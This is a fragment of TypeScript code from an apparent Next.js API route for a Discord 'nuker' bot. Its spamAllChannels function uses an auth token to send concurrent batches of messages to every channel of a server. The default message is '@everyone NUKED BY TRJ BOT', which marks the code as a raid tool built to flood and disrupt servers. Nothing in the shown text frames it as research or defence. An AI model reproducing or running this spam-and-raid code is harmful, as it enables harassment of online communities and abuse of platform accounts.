...
async function spamAllChannels(auth: string, ids: string[], msg: string, perCh: number): Promise<number> {
  ...
  await pExec(
    ...
    async (chId: string) => {
      let sent = 0;
      const batch = Math.min(perCh, 10);
      for (let w = 0; w < Math.ceil(perCh / batch); w++) {
        const cnt = Math.min(batch, perCh - sent);
        const res = await Promise.allSettled(
          Array.from({ length: cnt }, () => rawFetch(auth, 'POST', `/channels/${chId}/messages`, { content: msg }))
        );
        sent += res.filter(r => r.status === 'fulfilled' && r.value.ok).length;
        if (sent === 0 && w > 0) break;
      }
      total += sent;
      return { ok: sent > 0 };
...
export async function POST(request: NextRequest) {
  try {
    ...
    const {
      ...
      msgPerChannel = 5, message = '@everyone NUKED BY TRJ BOT',
